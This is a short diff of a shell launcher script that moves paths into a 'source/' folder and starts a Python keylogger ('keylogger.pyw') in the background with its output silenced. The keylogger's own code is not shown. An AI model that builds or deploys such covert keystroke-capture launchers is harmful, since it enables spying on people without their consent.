@@ -14,8 +14,8 @@ if [ $# -ge 2 ]; then
 fi
 
 if [ $LOG_INSTALL == "true" ]; then
-  sh ./initialize/installDependencies > /dev/null 2>&1;
+  sh ./source/initialize/installDependencies > /dev/null 2>&1;
 #install python
 fi
 
-source venv/bin/activate; python3 keylogger.pyw $1 > /dev/null 2>&1 &
+source source/venv/bin/activate; python3 source/keylogger.pyw $1 > /dev/null 2>&1 &
